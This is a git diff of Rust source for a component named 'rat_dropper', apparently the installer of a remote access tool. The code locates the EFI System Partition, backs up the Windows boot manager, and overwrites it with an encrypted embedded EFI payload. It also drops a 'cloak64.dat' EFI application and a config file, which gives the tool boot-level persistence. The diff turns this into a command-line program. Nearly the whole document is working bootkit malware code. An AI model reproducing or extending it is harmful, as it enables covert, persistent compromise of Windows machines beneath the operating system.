@@ -2,23 +2,23 @@ use std::ffi::c_void;
 use std::path::PathBuf;
 use std::{fs, io, ptr};
 
+use clap::Parser;
 use rat_common::utils::DropGuard;
 use rat_common::windows::RAT_EFI_FILE_NAME;
-use rat_dropper::{
-    EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, ESP_GUID, RELOADER_EFI_ENCRYPTED,
-};
+use rat_common::windows::config::Config;
+use rat_common::windows::utils::is_equal_guid;
+use rat_dropper::{EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, RELOADER_EFI_ENCRYPTED, cli};
 use windows_sys::Win32::Foundation::{
     CloseHandle, ERROR_NO_MORE_FILES, GetLastError, INVALID_HANDLE_VALUE, MAX_PATH,
 };
 use windows_sys::Win32::Storage::FileSystem::{
     CreateFileW, FILE_SHARE_READ, FILE_SHARE_WRITE, FindFirstVolumeW, FindNextVolumeW,
-    FindVolumeClose, OPEN_EXISTING,
+    FindVolumeClose, OPEN_EXISTING, PARTITION_SYSTEM_GUID,
 };
 use windows_sys::Win32::System::IO::DeviceIoControl;
 use windows_sys::Win32::System::Ioctl::{
     IOCTL_DISK_GET_PARTITION_INFO_EX, PARTITION_INFORMATION_EX, PARTITION_STYLE_GPT,
 };
-use windows_sys::core::GUID;
 use windows_sys::w;
 
 fn decrypt(cipher: &[u8]) -> Vec<u8> {
@@ -35,13 +35,6 @@ fn write_decrypted_payload(cipher: &[u8], f: &mut fs::File) -> io::Result<()> {
     io::copy(&mut decompressor, f)?;
 
     Ok(())
-}
-
-fn is_equal_guid(guid1: &GUID, guid2: &GUID) -> bool {
-    guid1.data1 == guid2.data1
-        && guid1.data2 == guid2.data2
-        && guid1.data3 == guid2.data3
-        && guid1.data4 == guid2.data4
 }
 
 fn is_esp_volume(volname: &mut [u16]) -> bool {
@@ -104,7 +97,7 @@ fn is_esp_volume(volname: &mut [u16]) -> bool {
     }
 
     let gpt = &unsafe { partition_info.Anonymous.Gpt };
-    if !is_equal_guid(&gpt.PartitionType, &ESP_GUID) {
+    if !is_equal_guid(&gpt.PartitionType, &PARTITION_SYSTEM_GUID) {
         return false;
     }
 
@@ -113,14 +106,16 @@ fn is_esp_volume(volname: &mut [u16]) -> bool {
     true
 }
 
-fn mount_esp_and_setup_persistence() -> bool {
+fn main() {
+    let arguments = cli::Arguments::parse();
+
     let mut volname = [0; MAX_PATH as usize];
 
     let volume = unsafe { FindFirstVolumeW(volname.as_mut_ptr(), volname.len() as u32) };
     if volume == INVALID_HANDLE_VALUE {
         let error = unsafe { GetLastError() };
         eprintln!("FindFirstVolumeW error: 0x{error:X} ({error})");
-        return false;
+        return;
     }
 
     let guard = DropGuard::new(volume, |v| unsafe {
@@ -147,7 +142,7 @@ fn mount_esp_and_setup_persistence() -> bool {
                 && let Err(e) = fs::copy(&bootmgfw, &bootmgfw_old)
             {
                 eprintln!("Failed to backup to {bootmgfw_old:?}: {e}");
-                return false;
+                return;
             }
 
             match fs::File::create(&bootmgfw) {
@@ -160,19 +155,19 @@ fn mount_esp_and_setup_persistence() -> bool {
                         let _ = fs::remove_file(&bootmgfw);
                         let _ = fs::copy(&bootmgfw_old, &bootmgfw);
 
-                        return false;
+                        return;
                     }
                 }
                 Err(e) => {
                     eprintln!("Failed to open {bootmgfw:?} for writing: {e}");
-                    return false;
+                    return;
                 }
             }
 
             let rat_efi = bootdir.join(RAT_EFI_FILE_NAME);
             if let Err(e) = fs::copy(&bootmgfw, &rat_efi) {
                 eprintln!("Failed to copy to {rat_efi:?}: {e}");
-                return false;
+                return;
             }
 
             let cloak64 = bootdir.join("cloak64.dat");
@@ -182,16 +177,41 @@ fn mount_esp_and_setup_persistence() -> bool {
                         eprintln!("Failed to write EFI application to {cloak64:?}: {e}");
                         drop(f);
 
-                        return false;
+                        let _ = fs::remove_file(&cloak64);
+
+                        return;
                     }
                 }
                 Err(e) => {
                     eprintln!("Failed to open {cloak64:?} for writing: {e}");
-                    return false;
+                    return;
                 }
             }
 
-            return true;
+            let config = bootdir.join("config.json");
+            match fs::File::create(&config) {
+                Ok(mut f) => {
+                    if let Err(e) = serde_json::to_writer_pretty(
+                        &mut f,
+                        &Config {
+                            argument: arguments.argument,
+                        },
+                    ) {
+                        eprintln!("Failed to write config to {config:?}: {e}");
+                        drop(f);
+
+                        let _ = fs::remove_file(&config);
+
+                        return;
+                    }
+                }
+                Err(e) => {
+                    eprintln!("Failed to open {config:?} for writing: {e}");
+                    return;
+                }
+            }
+
+            return;
         }
 
         volname.fill(0);
@@ -207,9 +227,4 @@ fn mount_esp_and_setup_persistence() -> bool {
     }
 
     drop(guard);
-    false
-}
-
-fn main() {
-    mount_esp_and_setup_persistence();
 }
